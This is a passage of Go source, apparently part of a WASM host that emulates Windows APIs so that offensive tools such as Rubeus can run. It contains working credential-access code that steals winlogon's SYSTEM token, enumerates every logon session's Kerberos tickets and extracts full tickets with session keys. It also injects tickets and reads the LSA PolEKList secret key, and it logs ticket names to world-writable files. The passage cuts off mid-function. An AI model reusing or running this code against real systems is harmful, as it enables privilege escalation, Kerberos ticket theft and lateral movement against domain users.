// ImpersonateLoggedOnUser (thread-local) but must NOT run on the COM
// STA thread — LSA's ALPC calls to LSASS can deadlock on an STA
// apartment because the RPC infrastructure may require a message pump
// that a simple worker loop doesn't provide.
func runOnLockedThread(fn func() (string, error)) (string, error) {
	type result struct {
		str string
		err error
	}
	ch := make(chan result, 1)
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		defer func() {
			if r := recover(); r != nil {
				lsaDebugLog("runOnLockedThread PANIC: %v", r)
				ch <- result{"", fmt.Errorf("panic in locked thread: %v", r)}
			}
		}()
		s, e := fn()
		ch <- result{s, e}
	}()
	r := <-ch
	return r.str, r.err
}

// win32LsaKerberosOp executes Kerberos LSA operations atomically on a
// dedicated locked OS thread, impersonating the SYSTEM token obtained from
// winlogon.exe. Uses a plain locked-thread goroutine (NOT the COM STA
// worker) to avoid ALPC/RPC deadlocks caused by STA apartment threading.
// All steps — token duplication, ImpersonateLoggedOnUser, LsaRegisterLogonProcess,
// LsaLookupAuthenticationPackage, the Kerberos call, and RevertToSelf — run on
// the same OS thread, preserving thread-local impersonation state.
//
// opPtr/opLen: UTF-8 operation string ("enumerate_tickets", etc.)
// luidLow/luidHigh: target LUID (both 0 = enumerate all sessions)
// outBufPtr/outBufLen: output buffer for null-separated "field\tvalue\n" records
// Returns: bytes written, or 0 on error.
func win32LsaKerberosOp(ctx context.Context, mod api.Module, opPtr, opLen, luidLow, luidHigh, outBufPtr, outBufLen uint32) (result uint32) {
	defer func() {
		if r := recover(); r != nil {
			lsaDebugLog("win32LsaKerberosOp PANIC: %v", r)
			mirrorDebugLog("win32LsaKerberosOp PANIC: %v", r)
			result = 0
		}
	}()

	cfg := getConfig(ctx)
	if cfg == nil || !cfg.Win32APIs {
		return 0
	}

	opBytes, ok := readBytes(mod, opPtr, opLen)
	if !ok || len(opBytes) == 0 {
		return 0
	}
	operation := string(opBytes)

	out, err := runOnLockedThread(func() (string, error) {
		return lsaKerberosOpSTA(operation, uint64(luidLow), uint64(luidHigh))
	})
	if err != nil {
		lsaDebugLog("win32LsaKerberosOp ERROR: %v", err)
		return 0
	}

	outSlice := []byte(out)
	lsaDebugLog("win32LsaKerberosOp: op=%q outLen=%d outBufLen=%d", operation, len(outSlice), outBufLen)
	if uint32(len(outSlice)) > outBufLen {
		outSlice = outSlice[:outBufLen]
	}
	if len(outSlice) == 0 {
		lsaDebugLog("win32LsaKerberosOp: empty output, returning 0")
		return 0
	}
	writeBytes(mod, outBufPtr, outSlice)
	lsaDebugLog("win32LsaKerberosOp: wrote %d bytes to WASM at 0x%x", len(outSlice), outBufPtr)
	return uint32(len(outSlice))
}

// lsaKerberosOpSTA is the inner implementation that runs on the STA thread.
// It impersonates SYSTEM via winlogon.exe, opens an LSA handle, looks up the
// Kerberos authentication package, and dispatches to the requested operation.
// lsaDebugLog appends a debug line to one of two world-writable paths.
// The previous localuser-Desktop path failed silently when run as
// win11-domainuser (no access) and as a parity test (the Process runs
// from C:\WfBin which the test relocates to with Everyone:(OI)(CI)RX).
// Falls back to TEMP if WfBin isn't accessible.
func lsaDebugLog(format string, args ...interface{}) {
	for _, p := range []string{`C:\WfBin\lsa-debug.txt`, `C:\Windows\Temp\lsa-debug.txt`} {
		if f, err := os.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
			fmt.Fprintf(f, format+"\n", args...)
			f.Close()
			return
		}
	}
}

func lsaKerberosOpSTA(operation string, luidLow, luidHigh uint64) (string, error) {
	lsaDebugLog("starting op=%q luid=%d/%d", operation, luidLow, luidHigh)
	kernel32DLL, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return "", fmt.Errorf("LoadDLL kernel32: %w", err)
	}
	advapi32DLL, err := syscall.LoadDLL("advapi32.dll")
	if err != nil {
		return "", fmt.Errorf("LoadDLL advapi32: %w", err)
	}
	secur32DLL, err := syscall.LoadDLL("secur32.dll")
	if err != nil {
		return "", fmt.Errorf("LoadDLL secur32: %w", err)
	}

	findProc := func(dll *syscall.DLL, name string) (*syscall.Proc, error) {
		p, err2 := dll.FindProc(name)
		if err2 != nil {
			return nil, fmt.Errorf("FindProc %s: %w", name, err2)
		}
		return p, nil
	}

	pSnap, err := findProc(kernel32DLL, "CreateToolhelp32Snapshot")
	if err != nil {
		return "", err
	}
	pProc32First, err := findProc(kernel32DLL, "Process32FirstW")
	if err != nil {
		return "", err
	}
	pProc32Next, err := findProc(kernel32DLL, "Process32NextW")
	if err != nil {
		return "", err
	}
	pCloseHandle, err := findProc(kernel32DLL, "CloseHandle")
	if err != nil {
		return "", err
	}
	pOpenProcessToken, err := findProc(advapi32DLL, "OpenProcessToken")
	if err != nil {
		return "", err
	}
	pDuplicateToken, err := findProc(advapi32DLL, "DuplicateToken")
	if err != nil {
		return "", err
	}
	pImpersonate, err := findProc(advapi32DLL, "ImpersonateLoggedOnUser")
	if err != nil {
		return "", err
	}
	pRevertToSelf, err := findProc(advapi32DLL, "RevertToSelf")
	if err != nil {
		return "", err
	}
	pLsaRegister, err := findProc(secur32DLL, "LsaRegisterLogonProcess")
	if err != nil {
		return "", err
	}
	pLsaConnectUntrusted, err := findProc(secur32DLL, "LsaConnectUntrusted")
	if err != nil {
		return "", err
	}
	pLsaLookup, err := findProc(secur32DLL, "LsaLookupAuthenticationPackage")
	if err != nil {
		return "", err
	}
	pLsaCall, err := findProc(secur32DLL, "LsaCallAuthenticationPackage")
	if err != nil {
		return "", err
	}
	pLsaFree, err := findProc(secur32DLL, "LsaFreeReturnBuffer")
	if err != nil {
		return "", err
	}
	pLsaDeregister, err := findProc(secur32DLL, "LsaDeregisterLogonProcess")
	if err != nil {
		return "", err
	}
	pLsaEnumSessions, _ := secur32DLL.FindProc("LsaEnumerateLogonSessions")

	// Step 1: Find winlogon.exe PID via CreateToolhelp32Snapshot.
	// PROCESSENTRY32W: dwSize(uint32) at 0, th32ProcessID(uint32) at 8,
	// szExeFile([MAX_PATH=260]uint16) at 44.
	//
	// Steps 1–5 try to elevate to SYSTEM via winlogon's token so we
	// can call LsaRegisterLogonProcess and query every session's
	// ticket cache. This requires admin; when the caller is a regular
	// user (the parity-test domainuser running klist) OpenProcess
	// fails with ERROR_ACCESS_DENIED. The original code aborted the
	// whole LSA op on failure — leaving Rubeus klist printing nothing.
	// Instead we log and fall through to step 6 (LsaConnectUntrusted),
	// which works without elevation and returns the caller's own
	// ticket cache — sufficient for the parity baseline.
	const (
		th32csSnapProcess = 0x00000002
		maxPath           = 260
	)
	// PROCESSENTRY32W size = 4 + 4 + 4 + 4 + 4 + 4 + 4 + 4 + 260*2 = 568 bytes on x64
	type processEntry32W struct {
		dwSize              uint32
		cntUsage            uint32
		th32ProcessID       uint32
		th32DefaultHeapID   uintptr
		th32ModuleID        uint32
		cntThreads          uint32
		th32ParentProcessID uint32
		pcPriClassBase      int32
		dwFlags             uint32
		szExeFile           [maxPath]uint16
	}

	var ret uintptr
	impersonated := false
	// Inline labeled break: any step 1-5 failure jumps past the
	// SYSTEM-impersonation block to step 6 (LsaConnectUntrusted).
impersonate:
	for once := 0; once < 1; once++ {
		snap, _, _ := pSnap.Call(th32csSnapProcess, 0)
		if snap == 0 || snap == ^uintptr(0) {
			lsaDebugLog("step1: CreateToolhelp32Snapshot failed — skipping impersonation")
			break impersonate
		}
		defer pCloseHandle.Call(snap)

		var winlogonPID uint32
		var pe processEntry32W
		pe.dwSize = uint32(unsafe.Sizeof(pe))
		ret, _, _ = pProc32First.Call(snap, uintptr(unsafe.Pointer(&pe)))
		for ret != 0 {
			name := windows.UTF16ToString(pe.szExeFile[:])
			if strings.EqualFold(name, "winlogon.exe") {
				winlogonPID = pe.th32ProcessID
				break
			}
			pe.dwSize = uint32(unsafe.Sizeof(pe))
			ret, _, _ = pProc32Next.Call(snap, uintptr(unsafe.Pointer(&pe)))
		}
		if winlogonPID == 0 {
			lsaDebugLog("step1: winlogon.exe not found — skipping impersonation")
			break impersonate
		}
		lsaDebugLog("step1: winlogon PID=%d", winlogonPID)

		// Step 2: Open winlogon.exe with PROCESS_QUERY_INFORMATION.
		const processQueryInformation = 0x0400
		advapi32Proc, _ := advapi32DLL.FindProc("OpenProcess")
		if advapi32Proc == nil {
			advapi32Proc, _ = kernel32DLL.FindProc("OpenProcess")
		}
		pOpenProcess := advapi32Proc
		var winlogonHandle uintptr
		if pOpenProcess != nil {
			winlogonHandle, _, _ = pOpenProcess.Call(processQueryInformation, 0, uintptr(winlogonPID))
		}
		if winlogonHandle == 0 {
			kp, _ := kernel32DLL.FindProc("OpenProcess")
			if kp != nil {
				winlogonHandle, _, _ = kp.Call(processQueryInformation, 0, uintptr(winlogonPID))
			}
		}
		if winlogonHandle == 0 {
			lsaDebugLog("step2: OpenProcess(winlogon) failed — skipping impersonation (regular-user context)")
			break impersonate
		}
		defer pCloseHandle.Call(winlogonHandle)
		lsaDebugLog("step2: winlogon handle=0x%x", winlogonHandle)

		// Step 3: Open the winlogon token.
		const tokenDuplicate = 0x0002
		var winlogonToken uintptr
		ret, _, _ = pOpenProcessToken.Call(winlogonHandle, tokenDuplicate, uintptr(unsafe.Pointer(&winlogonToken)))
		if ret == 0 || winlogonToken == 0 {
			lsaDebugLog("step3: OpenProcessToken(winlogon) failed — skipping impersonation")
			break impersonate
		}
		defer pCloseHandle.Call(winlogonToken)

		// Step 4: Duplicate to an impersonation token at SecurityImpersonation level.
		const securityImpersonation = 2
		var dupToken uintptr
		ret, _, _ = pDuplicateToken.Call(winlogonToken, securityImpersonation, uintptr(unsafe.Pointer(&dupToken)))
		if ret == 0 || dupToken == 0 {
			lsaDebugLog("step4: DuplicateToken failed — skipping impersonation")
			break impersonate
		}
		defer pCloseHandle.Call(dupToken)

		// Step 5: Impersonate SYSTEM.
		ret, _, _ = pImpersonate.Call(dupToken)
		if ret == 0 {
			lsaDebugLog("step5: ImpersonateLoggedOnUser failed — skipping impersonation")
			break impersonate
		}
		impersonated = true
		// Always revert before returning — impersonation is thread-local.
		defer pRevertToSelf.Call()
		lsaDebugLog("step5: impersonating SYSTEM")
	}
	if !impersonated {
		lsaDebugLog("steps1-5: falling through to step 6 with caller token (LsaConnectUntrusted)")
	}

	// LSA_STRING_IN: Length(uint16) at 0, MaximumLength(uint16) at 2, Buffer(*byte) at 8
	// (4-byte pad between MaximumLength and Buffer on x64)
	type lsaStringIn struct {
		length    uint16
		maxLength uint16
		_pad      [4]byte
		buffer    *byte
	}

	// Step 6: Connect to LSA.
	// Try LsaRegisterLogonProcess first (privileged — can query all sessions).
	// Falls back to LsaConnectUntrusted if registration fails.
	var lsaHandle uintptr
	logonProcessName := []byte("LogonInit")
	lsaStr := lsaStringIn{
		length:    uint16(len(logonProcessName)),
		maxLength: uint16(len(logonProcessName)),
		buffer:    &logonProcessName[0],
	}
	var lsaMode uint32
	lsaDebugLog("step6: calling LsaRegisterLogonProcess")
	ntstatus, _, _ := pLsaRegister.Call(
		uintptr(unsafe.Pointer(&lsaStr)),
		uintptr(unsafe.Pointer(&lsaHandle)),
		uintptr(unsafe.Pointer(&lsaMode)),
	)
	lsaDebugLog("step6: LsaRegisterLogonProcess ntstatus=0x%x handle=0x%x mode=0x%x", ntstatus, lsaHandle, lsaMode)
	if ntstatus != 0 || lsaHandle == 0 {
		// Fallback: LsaConnectUntrusted (limited to current session)
		lsaDebugLog("step6: falling back to LsaConnectUntrusted")
		lsaHandle = 0 // reset in case LsaRegisterLogonProcess left garbage
		ntstatus, _, _ = pLsaConnectUntrusted.Call(uintptr(unsafe.Pointer(&lsaHandle)))
		lsaDebugLog("step6: LsaConnectUntrusted ntstatus=0x%x handle=0x%x", ntstatus, lsaHandle)
		if ntstatus != 0 || lsaHandle == 0 {
			return "", fmt.Errorf("LsaConnectUntrusted: 0x%x", ntstatus)
		}
	}
	defer pLsaDeregister.Call(lsaHandle)

	// Step 7: LsaLookupAuthenticationPackage(lsaHandle, &kerbName, &authPkg)
	kerbName := []byte("kerberos")
	ls := lsaStringIn{
		length:    uint16(len(kerbName)),
		maxLength: uint16(len(kerbName)),
		buffer:    &kerbName[0],
	}
	var authPkg uint32
	lsaDebugLog("step7: calling LsaLookupAuthenticationPackage handle=0x%x", lsaHandle)
	ntstatus, _, _ = pLsaLookup.Call(lsaHandle, uintptr(unsafe.Pointer(&ls)), uintptr(unsafe.Pointer(&authPkg)))
	lsaDebugLog("step7: LsaLookup ntstatus=0x%x authPkg=%d", ntstatus, authPkg)
	if ntstatus != 0 {
		return "", fmt.Errorf("LsaLookupAuthenticationPackage: 0x%x", ntstatus)
	}

	// Parse operation and optional tab-separated parameters.
	// Format: "operation\tparam1\tparam2\t..."
	opParts := strings.SplitN(operation, "\t", 4)
	opName := opParts[0]

	// Dispatch to the requested operation.
	lsaDebugLog("dispatch: op=%q lsaHandle=0x%x authPkg=%d", opName, lsaHandle, authPkg)
	switch opName {
	case "enumerate_tickets":
		// When the caller isn't running as SYSTEM we cannot query
		// other sessions' ticket caches — LsaCallAuthenticationPackage
		// returns STATUS_PRIVILEGE_NOT_HELD (0xC0000061) for every
		// foreign LUID. Skip EnumerateLogonSessions and just query the
		// current session (luid=0,0) which Windows interprets as
		// "this caller's session". Matches what `klist.exe` prints
		// for an unelevated user.
		effLow, effHigh := luidLow, luidHigh
		if !impersonated && luidLow == 0 && luidHigh == 0 {
			// Setting both to nonzero would change semantics; instead
			// just suppress the per-session sweep by NEVER calling
			// LsaEnumerateLogonSessions (pass nil).
			return lsaEnumerateTickets(lsaHandle, authPkg, effLow, effHigh,
				pLsaCall, pLsaFree, nil)
		}
		return lsaEnumerateTickets(lsaHandle, authPkg, effLow, effHigh,
			pLsaCall, pLsaFree, pLsaEnumSessions)

	case "retrieve_ticket":
		// retrieve_ticket\tSERVER_NAME[\tCACHE_OPTIONS[\tENCRYPTION_TYPE]]
		if len(opParts) < 2 || opParts[1] == "" {
			return "", fmt.Errorf("retrieve_ticket requires server name parameter")
		}
		serverName := opParts[1]
		cacheOptions := uint32(8) // KERB_RETRIEVE_TICKET_AS_KERB_CRED
		encType := int32(0)
		if len(opParts) >= 3 && opParts[2] != "" {
			if v, err := fmt.Sscanf(opParts[2], "%d", &cacheOptions); v != 1 || err != nil {
				cacheOptions = 8
			}
		}
		if len(opParts) >= 4 && opParts[3] != "" {
			fmt.Sscanf(opParts[3], "%d", &encType)
		}
		retEnumSessions := pLsaEnumSessions
		if !impersonated && luidLow == 0 && luidHigh == 0 {
			// Mirror the enumerate_tickets behavior: non-elevated callers
			// with luid={0,0} should query only their own session. Pass nil
			// so lsaRetrieveTicket takes the current-session short-circuit
			// rather than walking foreign LUIDs (which all return
			// STATUS_PRIVILEGE_NOT_HELD anyway).
			retEnumSessions = nil
		}
		return lsaRetrieveTicket(lsaHandle, authPkg, luidLow, luidHigh,
			serverName, cacheOptions, encType,
			pLsaCall, pLsaFree, retEnumSessions)

	case "purge_tickets":
		// purge_tickets[\tSERVER_NAME\tREALM_NAME]
		serverName := ""
		realmName := ""
		if len(opParts) >= 2 {
			serverName = opParts[1]
		}
		if len(opParts) >= 3 {
			realmName = opParts[2]
		}
		return lsaPurgeTickets(lsaHandle, authPkg, luidLow, luidHigh,
			serverName, realmName, pLsaCall, pLsaFree)

	case "submit_ticket":
		// submit_ticket\tBASE64_KIRBI_DATA
		if len(opParts) < 2 || opParts[1] == "" {
			return "", fmt.Errorf("submit_ticket requires base64 ticket data")
		}
		return lsaSubmitTicket(lsaHandle, authPkg, luidLow, luidHigh,
			opParts[1], pLsaCall, pLsaFree)

	case "read_secret_key":
		// read_secret_key\tHIVE\tKEY_PATH\tVALUE_NAME
		//   HIVE: hex string of the HKEY constant (e.g. "80000002" for HKLM)
		//   KEY_PATH: registry key path under HIVE (e.g. "SECURITY\\Policy\\PolEKList")
		//   VALUE_NAME: registry value name (empty string for default value)
		//
		// Returns the raw value bytes as a base64-encoded string. The
		// LSA secret-key reads (PolEKList, etc.) require SYSTEM
		// impersonation which the surrounding handler has already
		// established for this thread (see step5: ImpersonateLoggedOnUser
		// above). Reusing the same op keeps the impersonation discipline
		// in one place instead of duplicating it across primitives.
		if len(opParts) < 3 {
			return "", fmt.Errorf("read_secret_key requires HIVE\\tPATH[\\tVALUE_NAME]")
		}
		valueName := ""
		if len(opParts) >= 4 {
			valueName = opParts[3]
		}
		return lsaReadSecretKey(opParts[1], opParts[2], valueName)

	default:
		return "", fmt.Errorf("unknown kerberos operation: %s", opName)
	}
}

// lsaReadSecretKey opens a registry value under HKLM\SECURITY (or any
// HKEY) on the current (impersonated) thread context and returns the
// raw value bytes base64-encoded. Used by SharpDPAPI / SharpHound style
// tools that need to derive the LSA key from HKLM\SECURITY\Policy\PolEKList,
// which is only readable under the SYSTEM token.
//
// The handler that called us already impersonated SYSTEM on this
// thread, so a plain RegOpenKeyExW/RegQueryValueEx chain works here
// even though the guest-side path would be denied access.
func lsaReadSecretKey(hiveHex, keyPath, valueName string) (string, error) {
	var hive uint64
	if _, err := fmt.Sscanf(hiveHex, "%x", &hive); err != nil {
		return "", fmt.Errorf("read_secret_key: invalid hive %q: %v", hiveHex, err)
	}

	advapi32, err := syscall.LoadDLL("advapi32.dll")
	if err != nil {
		return "", fmt.Errorf("read_secret_key: LoadDLL advapi32: %v", err)
	}
	defer advapi32.Release()
	pOpen, err := advapi32.FindProc("RegOpenKeyExW")
	if err != nil {
		return "", err
	}
	pQuery, err := advapi32.FindProc("RegQueryValueExW")
	if err != nil {
		return "", err
	}
	pClose, err := advapi32.FindProc("RegCloseKey")
	if err != nil {
		return "", err
	}

	pathPtr, err := syscall.UTF16PtrFromString(keyPath)
	if err != nil {
		return "", err
	}

	const KEY_READ = 0x20019
	var hKey syscall.Handle
	r1, _, _ := pOpen.Call(uintptr(hive), uintptr(unsafe.Pointer(pathPtr)), 0,
		KEY_READ, uintptr(unsafe.Pointer(&hKey)))
	if r1 != 0 {
		return "", fmt.Errorf("read_secret_key: RegOpenKeyExW(%s): %d", keyPath, r1)
	}
	defer pClose.Call(uintptr(hKey))

	var namePtr *uint16
	if valueName != "" {
		p, err := syscall.UTF16PtrFromString(valueName)
		if err != nil {
			return "", err
		}
		namePtr = p
	}

	// Two-call size-probe: pass nil data buffer first to get required size.
	var cbData uint32
	r1, _, _ = pQuery.Call(uintptr(hKey), uintptr(unsafe.Pointer(namePtr)),
		0, 0, 0, uintptr(unsafe.Pointer(&cbData)))
	if r1 != 0 {
		return "", fmt.Errorf("read_secret_key: RegQueryValueExW(size) %s: %d", keyPath, r1)
	}
	if cbData == 0 {
		return "", nil
	}

	buf := make([]byte, cbData)
	r1, _, _ = pQuery.Call(uintptr(hKey), uintptr(unsafe.Pointer(namePtr)),
		0, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&cbData)))
	if r1 != 0 {
		return "", fmt.Errorf("read_secret_key: RegQueryValueExW(data) %s: %d", keyPath, r1)
	}

	return base64.StdEncoding.EncodeToString(buf[:cbData]), nil
}

// lsaEnumerateTickets queries Kerberos ticket caches via KERB_QUERY_TKT_CACHE_EX_MESSAGE.
// If luidLow|luidHigh == 0 it enumerates all logon sessions first; otherwise queries
// only the specified LUID.
//
// Output format: null-separated "field\tvalue\n" records with blank lines between
// tickets and double blank lines between sessions.
func lsaEnumerateTickets(
	lsaHandle uintptr, authPkg uint32,
	luidLow, luidHigh uint64,
	pLsaCall, pLsaFree, pLsaEnumSessions *syscall.Proc,
) (string, error) {
	type luid struct {
		lowPart  uint32
		highPart int32
	}

	// querySessionTickets sends KERB_QUERY_TKT_CACHE_EX_MESSAGE for one LUID
	// and appends the results to buf, returning the updated buf.
	//
	// KERB_QUERY_TKT_CACHE_REQUEST layout (x64):
	//   MessageType(uint32) at 0, LogonId(LUID: LowPart uint32 at 4, HighPart int32 at 8)
	// KERB_QUERY_TKT_CACHE_RESPONSE layout (x64):
	//   MessageType(uint32) at 0, CountOfTickets(uint32) at 4, Tickets[] at 8
	// Each KERB_TICKET_CACHE_INFO_EX has UNICODE_STRING fields (16 bytes each
	// on x64: Length/MaximumLength at +0/+2, Buffer *uint16 at +8) followed by
	// int64 times and int32/uint32 enum/flags.
	// Use EX2 message (type 14) which returns ticket data. Despite docs saying
	// EX2 structs should be 104 bytes (EX + SessionKeyType + BranchId), Win11
	// returns 96-byte structs (same as EX). Type 12 (EX) returns 0 tickets on
	// Win11 for non-current LUIDs, so we must use type 14.
	const kerbQueryTicketCacheEx2Message = 14
	querySessionTickets := func(l luid) []byte {
		type kerbQueryTktCacheRequest struct {
			messageType uint32
			logonIdLow  uint32
			logonIdHigh int32
		}
		req := kerbQueryTktCacheRequest{
			messageType: kerbQueryTicketCacheEx2Message,
			logonIdLow:  l.lowPart,
			logonIdHigh: l.highPart,
		}

		var respPtr uintptr
		var respLen uint32
		var subStatus uint32
		lsaDebugLog("LsaCall: LUID=%d/%d msgType=%d", l.lowPart, l.highPart, req.messageType)
		ntstatus, _, _ := pLsaCall.Call(
			lsaHandle,
			uintptr(authPkg),
			uintptr(unsafe.Pointer(&req)),
			unsafe.Sizeof(req),
			uintptr(unsafe.Pointer(&respPtr)),
			uintptr(unsafe.Pointer(&respLen)),
			uintptr(unsafe.Pointer(&subStatus)),
		)
		lsaDebugLog("LsaCall returned: ntstatus=0x%x respPtr=0x%x respLen=%d subStatus=0x%x", ntstatus, respPtr, respLen, subStatus)
		if ntstatus != 0 || respPtr == 0 {
			return nil
		}
		defer pLsaFree.Call(respPtr)

		// Read MessageType(uint32) at +0, CountOfTickets(uint32) at +4.
		countOfTickets := *(*uint32)(unsafe.Pointer(respPtr + 4))
		lsaDebugLog("countOfTickets=%d", countOfTickets)
		if countOfTickets == 0 {
			return nil
		}

		// KERB_TICKET_CACHE_INFO_EX layout (x64):
		// Each UNICODE_STRING is 16 bytes: Length(2)+MaxLen(2)+pad(4)+Buffer(8)
		// ClientName    +0   (16 bytes)
		// ClientRealm   +16  (16 bytes)
		// ServerName    +32  (16 bytes)
		// ServerRealm   +48  (16 bytes)
		// StartTime     +64  (int64)
		// EndTime       +72  (int64)
		// RenewTime     +80  (int64)
		// EncryptionType+88  (int32)
		// TicketFlags   +92  (uint32)
		// Total = 96 bytes
		const (
			offClientName  = 0
			offClientRealm = 16
			offServerName  = 32
			offServerRealm = 48
			offStartTime   = 64
			offEndTime     = 72
			offRenewTime   = 80
			offEncType     = 88
			offFlags       = 92
			ticketSize     = 96 // EX size (no SessionKeyType/BranchId)
		)

		readUnicodeString := func(base uintptr, off uintptr) (s string) {
			defer func() {
				if r := recover(); r != nil {
					lsaDebugLog("readUnicodeString PANIC: base=0x%x off=0x%x: %v", base, off, r)
					s = ""
				}
			}()
			length := *(*uint16)(unsafe.Pointer(base + off))
			bufPtr := *(*uintptr)(unsafe.Pointer(base + off + 8))
			if bufPtr == 0 || length == 0 {
				return ""
			}
			charCount := uintptr(length) / 2
			if charCount > 4096 { // sanity: no Kerberos name should be >4K chars
				lsaDebugLog("readUnicodeString: excessive charCount=%d at base=0x%x off=0x%x", charCount, base, off)
				return ""
			}
			utf16Slice := unsafe.Slice((*uint16)(unsafe.Pointer(bufPtr)), charCount)
			return windows.UTF16ToString(utf16Slice)
		}

		ticketsBase := respPtr + 8
		var out []byte
		for i := uint32(0); i < countOfTickets; i++ {
			base := ticketsBase + uintptr(i)*ticketSize
			lsaDebugLog("ticket[%d]: base=0x%x (respEnd=0x%x)", i, base, respPtr+uintptr(respLen))
			// Bounds check: ensure the ticket struct is within the response buffer
			if base+ticketSize > respPtr+uintptr(respLen) {
				lsaDebugLog("ticket[%d]: OOB — base+ticketSize=0x%x exceeds respEnd=0x%x", i, base+ticketSize, respPtr+uintptr(respLen))
				break
			}
			// Dump first 16 bytes of the ticket struct (ClientName UNICODE_STRING)
			usLen := *(*uint16)(unsafe.Pointer(base + 0))
			usMaxLen := *(*uint16)(unsafe.Pointer(base + 2))
			usBufPtr := *(*uintptr)(unsafe.Pointer(base + 8))
			lsaDebugLog("ticket[%d]: ClientName US: len=%d maxLen=%d bufPtr=0x%x", i, usLen, usMaxLen, usBufPtr)
			clientName := readUnicodeString(base, offClientName)
			lsaDebugLog("ticket[%d]: clientName=%q", i, clientName)
			clientRealm := readUnicodeString(base, offClientRealm)
			serverName := readUnicodeString(base, offServerName)
			serverRealm := readUnicodeString(base, offServerRealm)
			lsaDebugLog("ticket[%d]: strings done, reading times", i)
			startTime := *(*int64)(unsafe.Pointer(base + offStartTime))
			endTime := *(*int64)(unsafe.Pointer(base + offEndTime))
			renewTime := *(*int64)(unsafe.Pointer(base + offRenewTime))
			encType := *(*int32)(unsafe.Pointer(base + offEncType))
			ticketFlags := *(*uint32)(unsafe.Pointer(base + offFlags))

			lsaDebugLog("ticket[%d]: client=%s@%s server=%s@%s enc=%d flags=0x%x",
				i, clientName, clientRealm, serverName, serverRealm, encType, ticketFlags)

			appendField := func(key, val string) {
				out = append(out, []byte(key+"\t"+val+"\n")...)
			}
			appendField("ClientName", clientName)
			appendField("ClientRealm", clientRealm)
			appendField("ServerName", serverName)
			appendField("ServerRealm", serverRealm)
			appendField("StartTime", fmt.Sprintf("%d", startTime))
			appendField("EndTime", fmt.Sprintf("%d", endTime))
			appendField("RenewTime", fmt.Sprintf("%d", renewTime))
			appendField("EncryptionType", fmt.Sprintf("%d", encType))
			appendField("TicketFlags", fmt.Sprintf("0x%x", ticketFlags))
			out = append(out, '\n') // blank line between tickets
		}
		lsaDebugLog("querySessionTickets: returning %d bytes for %d tickets", len(out), countOfTickets)
		return out
	}

	var buf []byte

	if luidLow == 0 && luidHigh == 0 {
		// When pLsaEnumSessions is nil the caller is non-elevated and
		// can't query other sessions anyway (LsaCall returns
		// STATUS_PRIVILEGE_NOT_HELD for every foreign LUID). Query just
		// the caller's current session — Windows treats luid=0,0 as
		// "this session".
		if pLsaEnumSessions == nil {
			lsaDebugLog("non-elevated: querying current session only (luid=0,0)")
			buf := querySessionTickets(luid{lowPart: 0, highPart: 0})
			lsaDebugLog("lsaEnumerateTickets (current session): %d bytes", len(buf))
			return string(buf), nil
		}
		// Enumerate all logon sessions.
		lsaDebugLog("enumerating ALL logon sessions")
		var count uint32
		var luidsPtr uintptr
		ntstatus, _, _ := pLsaEnumSessions.Call(
			uintptr(unsafe.Pointer(&count)),
			uintptr(unsafe.Pointer(&luidsPtr)),
		)
		lsaDebugLog("LsaEnumerateLogonSessions: count=%d ntstatus=0x%x", count, ntstatus)
		if ntstatus != 0 || luidsPtr == 0 || count == 0 {
			return "", fmt.Errorf("LsaEnumerateLogonSessions: 0x%x", ntstatus)
		}
		defer pLsaFree.Call(luidsPtr)

		const luidSize = 8
		for i := uint32(0); i < count; i++ {
			luidAddr := luidsPtr + uintptr(i)*luidSize
			l := luid{
				lowPart:  *(*uint32)(unsafe.Pointer(luidAddr)),
				highPart: *(*int32)(unsafe.Pointer(luidAddr + 4)),
			}
			tickets := querySessionTickets(l)
			if len(tickets) > 0 {
				buf = append(buf, tickets...)
				buf = append(buf, '\n') // double blank line between sessions
			}
		}
	} else {
		// Query a specific LUID.
		l := luid{
			lowPart:  uint32(luidLow),
			highPart: int32(luidHigh),
		}
		buf = querySessionTickets(l)
	}

	lsaDebugLog("lsaEnumerateTickets: total output %d bytes", len(buf))
	return string(buf), nil
}

// lsaRetrieveTicket extracts a full Kerberos ticket (KRB_CRED / .kirbi format)
// for a specific service principal from the ticket cache.
//
// Uses KERB_RETRIEVE_TKT_REQUEST (MessageType=8) with KERB_RETRIEVE_TICKET_AS_KERB_CRED
// cache option to get the complete ticket including session key.
//
// The request buffer must be contiguous: [struct (64 bytes)] + [TargetName UTF-16 bytes].
// The TargetName UNICODE_STRING.Buffer pointer must reference the appended data.
//
// KERB_RETRIEVE_TKT_REQUEST layout (x64):
//
//	Offset 0:  MessageType (uint32) = 8
//	Offset 4:  pad (uint32)
//	Offset 8:  LogonId.LowPart (uint32)
//	Offset 12: LogonId.HighPart (int32)
//	Offset 16: TargetName (UNICODE_STRING: Length(2)+MaxLen(2)+pad(4)+Buffer(8) = 16 bytes)
//	Offset 32: TicketFlags (uint32)
//	Offset 36: CacheOptions (uint32)
//	Offset 40: EncryptionType (int32)
//	Offset 44: pad (4 bytes)
//	Offset 48: CredentialsHandle (SecHandle: 2 × uintptr = 16 bytes)
//	Total: 64 bytes
//
// KERB_EXTERNAL_TICKET layout (x64):
//
//	Offset 0:   ServiceName (*KERB_EXTERNAL_NAME, 8 bytes)
//	Offset 8:   TargetName (*KERB_EXTERNAL_NAME, 8 bytes)
//	Offset 16:  ClientName (*KERB_EXTERNAL_NAME, 8 bytes)
//	Offset 24:  DomainName (UNICODE_STRING, 16 bytes)
//	Offset 40:  TargetDomainName (UNICODE_STRING, 16 bytes)
//	Offset 56:  AltTargetDomainName (UNICODE_STRING, 16 bytes)
//	Offset 72:  SessionKey.KeyType (int32)
//	Offset 76:  SessionKey.Length (uint32)
//	Offset 80:  SessionKey.Value (*byte, 8 bytes)
//	Offset 88:  TicketFlags (uint32)
//	Offset 92:  Flags (uint32)
//	Offset 96:  KeyExpirationTime (int64)
//	Offset 104: StartTime (int64)
//	Offset 112: EndTime (int64)
//	Offset 120: RenewUntil (int64)
//	Offset 128: TimeSkew (int64)
//	Offset 136: EncodedTicketSize (uint32)
//	Offset 140: pad (4 bytes)
//	Offset 144: EncodedTicket (*byte, 8 bytes)
//	Total: 152 bytes
//
// Output format: "field\tvalue\n" records. The base64-encoded .kirbi ticket is
// returned in the "Base64EncodedTicket" field. If luidLow|luidHigh == 0 it
// retrieves from all logon sessions (iterating each); otherwise from the
// specified session only.
func lsaRetrieveTicket(
	lsaHandle uintptr, authPkg uint32,
	luidLow, luidHigh uint64,
